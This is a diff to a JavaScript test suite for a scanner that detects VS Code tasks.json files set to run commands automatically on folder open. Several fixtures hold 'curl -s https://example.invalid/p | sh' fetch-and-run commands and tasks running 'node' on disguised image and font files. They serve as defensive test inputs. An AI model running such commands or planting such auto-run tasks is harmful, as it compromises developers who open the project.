@@ -124,6 +124,45 @@ const files = {
   osMixed: put('r9/.vscode/tasks.json', '{ "tasks": [ { "label": "dev", "type": "shell", "command": "npm run dev",\n' +
     '  "windows": { "command": "node" }, "linux": { "args": ["public/fonts/x.llf"] },\n' +
     '  "runOptions": { "runOn": "folderOpen" } } ] }\n'),
+  // security review (PR #4): inputs VS Code still auto-runs
+  runOnCase: put('s1/.vscode/tasks.json', '{ "tasks": [ { "label": "setup", "type": "shell", "command": "node public/img/logo.png",\n' +
+    '  "runOptions": { "runOn": "FolderOpen" } } ] }\n'),
+  worktreeTask: put('s2/.vscode/tasks.json', '{ "tasks": [ { "label": "wt", "type": "shell", "command": "curl -s https://example.invalid/p | sh",\n' +
+    '  "runOptions": { "runOn": "worktreeCreated" } } ] }\n'),
+  osList: put('s3/.vscode/tasks.json', '{ "version": "2.0.0", "osx": { "tasks": [ { "label": "x", "type": "shell",\n' +
+    '  "command": "curl -s https://example.invalid/p | sh", "runOptions": { "runOn": "folderOpen" } } ] } }\n'),
+  upperPath: put('s4/.VSCode/Tasks.json', '{ "tasks": [ { "label": "setup", "type": "shell", "command": "node public/img/logo.png",\n' +
+    '  "runOptions": { "runOn": "folderOpen" } } ] }\n'),
+  dependsOnTask: put('s5/.vscode/tasks.json', '{ "tasks": [\n' +
+    '  { "label": "b", "type": "shell", "command": "curl -s https://example.invalid/p | sh" },\n' +
+    '  { "label": "init", "dependsOn": ["b"], "runOptions": { "runOn": "folderOpen" } } ] }\n'),
+  legacyHidden: put('s6/.vscode/tasks.json', '{ "tasks": [ { "label": "w", "type": "shell", "command": "npm run watch",\n' +
+    '  "terminal": { "reveal": "Never" }, "runOptions": { "runOn": "folderOpen" } } ] }\n'),
+  dependsOnBenign: put('s7/.vscode/tasks.json', '{ "tasks": [\n' +
+    '  { "label": "build", "type": "shell", "command": "npm run build" },\n' +
+    '  { "label": "watch", "dependsOn": "build", "runOptions": { "runOn": "folderOpen" } } ] }\n'),
+  brokenCase: put('s8/.vscode/tasks.json', '{ "tasks": [ { "label": "w", "command": "node public/fonts/x.llf",\n' +
+    '  "runOptions": { "runOn": "FOLDEROPEN" } }\n'),
+  // verification round on the security fixes: VS Code merge semantics
+  hideDep: put('v1/.vscode/tasks.json', '{ "version": "2.0.0", "tasks": [ { "label": "install", "type": "shell", "command": "npm install", "hide": true },\n' +
+    '  { "label": "dev", "type": "shell", "command": "npm run dev", "dependsOn": ["install"], "runOptions": { "runOn": "folderOpen" } } ] }\n'),
+  legacyOverridden: put('v2/.vscode/tasks.json', '{ "version": "2.0.0", "showOutput": "never", "tasks": [\n' +
+    '  { "label": "a", "type": "shell", "command": "npm run a", "showOutput": "never", "presentation": { "reveal": "always" }, "runOptions": { "runOn": "folderOpen" } },\n' +
+    '  { "label": "b", "type": "shell", "command": "npm run b", "presentation": { "reveal": "always" }, "runOptions": { "runOn": "folderOpen" } },\n' +
+    '  { "label": "c", "type": "shell", "command": "npm run c", "echoCommand": false, "presentation": { "echo": true, "reveal": "always" }, "runOptions": { "runOn": "folderOpen" } } ] }\n'),
+  osBlockDepends: put('v3/.vscode/tasks.json', '{ "version": "2.0.0", "tasks": [ { "label": "b", "type": "shell", "command": "npm run watch", "presentation": { "reveal": "never" } },\n' +
+    '  { "label": "dev", "type": "shell", "command": "npm run dev", "windows": { "dependsOn": "b" }, "runOptions": { "runOn": "folderOpen" } } ] }\n'),
+  nullCommand: put('v4/.vscode/tasks.json', '{ "version": "2.0.0", "osx": { "command": "curl -s https://example.invalid/p | sh" },\n' +
+    '  "tasks": [ { "label": "dev", "type": "shell", "command": null, "runOptions": { "runOn": "folderOpen" } } ] }\n'),
+  nullReveal: put('v5/.vscode/tasks.json', '{ "version": "2.0.0", "presentation": { "reveal": "never" }, "tasks": [ { "label": "dev", "type": "shell",\n' +
+    '  "command": "npm run setup", "presentation": { "reveal": null }, "runOptions": { "runOn": "folderOpen" } } ] }\n'),
+  fileArgs: put('v6/.vscode/tasks.json', '{ "version": "2.0.0", "osx": { "command": "node", "args": ["public/fonts/fa-solid-300.llf"] },\n' +
+    '  "tasks": [ { "label": "dev", "args": ["--watch"], "runOptions": { "runOn": "folderOpen" } } ] }\n'),
+  osListScope: put('v7/.vscode/tasks.json', '{ "version": "2.0.0", "osx": { "tasks": [ { "label": "a", "type": "shell", "command": "echo a", "dependsOn": "b",\n' +
+    '  "windows": { "command": "curl -s https://example.invalid/p | sh" }, "runOptions": { "runOn": "folderOpen" } } ] },\n' +
+    '  "windows": { "tasks": [ { "label": "b", "type": "shell", "command": "curl -s https://example.invalid/p | sh" } ] },\n' +
+    '  "tasks": [ { "label": "b", "type": "shell", "command": "echo b" } ] }\n'),
+  workspaceNoTasks: put('v8/a.code-workspace', '{ "folders": [ { "path": "." } ], "launch": { "configurations": [ { "name": "x", "runOn": "FolderOpen" } ] } }\n'),
   osEvil: put('r10/.vscode/tasks.json', '{ "tasks": [ { "label": "dev", "type": "shell", "command": "npm run dev",\n' +
     '  "osx": { "command": "node", "args": ["public/fonts/x.llf"] }, "runOptions": { "runOn": "folderOpen" } } ] }\n'),
 };
@@ -158,6 +197,44 @@ check('REVIEW2: trailing comma far from its bracket + escaped quotes still block
 check('REVIEW2: windows command + linux args are not paired into one command', !crit(files.osMixed) &&
   at(files.osMixed).some((f) => f.severity === 'warning'));
 check('REVIEW2: a dangerous per-OS command still blocks, naming the OS', at(files.osEvil).some((f) => f.severity === 'critical' && /on osx/.test(f.message)));
+check('SEC: runOn "FolderOpen" (VS Code lowercases it) blocks', crit(files.runOnCase, 'vscode-autorun'));
+check('SEC: runOn worktreeCreated task that downloads code blocks', crit(files.worktreeTask, 'vscode-autorun'));
+check('SEC: task in the file-level osx task list blocks', crit(files.osList, 'vscode-autorun'));
+check('SEC: .VSCode/Tasks.json is checked like .vscode/tasks.json', crit(files.upperPath, 'vscode-autorun'));
+check('SEC: dangerous dependsOn task of a folder-open task blocks',
+  at(files.dependsOnTask).some((f) => f.severity === 'critical' && /dependsOn task "b"/.test(f.message)));
+check('SEC: legacy terminal.reveal "Never" counts as hidden', crit(files.legacyHidden, 'vscode-autorun'));
+check('SEC: benign dependsOn task keeps a plain warning', !crit(files.dependsOnBenign) &&
+  at(files.dependsOnBenign).some((f) => f.severity === 'warning'));
+check('SEC: unparseable tasks file with runOn "FOLDEROPEN" blocks', crit(files.brokenCase, 'vscode-autorun'));
+const onlyWarnings = (rel, n) => !crit(rel) && at(rel).filter((f) => f.severity === 'warning').length === n;
+check('SEC2: hide (quick-pick only) on a dependsOn task is not "hidden"', onlyWarnings(files.hideDep, 1));
+check('SEC2: presentation.reveal/echo override legacy showOutput/echoCommand', onlyWarnings(files.legacyOverridden, 3));
+check('SEC2: dependsOn inside a task\'s OS block is ignored, as VS Code ignores it', onlyWarnings(files.osBlockDepends, 1));
+check('SEC2: null task command falls back to the file command', crit(files.nullCommand, 'vscode-autorun'));
+check('SEC2: null reveal falls back to the file reveal', crit(files.nullReveal, 'vscode-autorun'));
+check('SEC2: file command + file args + task args are judged together',
+  at(files.fileArgs).some((f) => f.severity === 'critical' && /on osx/.test(f.message)));
+check('SEC2: an osx-list task is judged on osx only, with osx dependencies', onlyWarnings(files.osListScope, 1));
+check('SEC2: parseable .code-workspace without tasks is not reported', at(files.workspaceNoTasks).length === 0);
+{
+  // dependsOn analysis stays fast at the limits: a dense graph, and every reference resolving to every task.
+  const { scanArtifacts } = require('../src/artifacts');
+  const timed = (tasks) => {
+    const t0 = process.hrtime.bigint();
+    const r = scanArtifacts('.vscode/tasks.json', JSON.stringify({ version: '2.0.0', tasks }));
+    return { r, ms: Math.round(Number(process.hrtime.bigint() - t0) / 1e6) };
+  };
+  const auto = { runOn: 'folderOpen' };
+  const dense = timed(Array.from({ length: 70 }, (_, i) => ({ label: `t${i}`, command: 'npm run x',
+    dependsOn: Array.from({ length: 70 }, (_, j) => `t${j}`), runOptions: auto })));
+  check(`SEC2: dense dependsOn graph scans fast (${dense.ms} ms)`, dense.ms < 2000 && dense.r.findings.length === 70);
+  const same = timed(Array.from({ length: 1000 }, () => ({ label: 'x', command: 'npm run x', dependsOn: ['x', 'x', 'x', 'x', 'x'], runOptions: auto })));
+  check(`SEC2: shared-label dependsOn graph scans fast (${same.ms} ms)`, same.ms < 2000 && same.r.findings.length === 1000);
+  const huge = JSON.stringify({ version: '2.0.0', tasks: Array.from({ length: 1001 }, (_, i) => ({ label: `t${i}`, command: 'echo' })) });
+  check('SEC2: over-limit task file is reported for review', scanArtifacts('.vscode/tasks.json', huge).findings
+    .some((f) => f.severity === 'critical' && /review it by hand/.test(f.message)));
+}
 fs.rmSync(art, { recursive: true, force: true });
 
 // --- Supply-chain layer ----------------------------------------------------
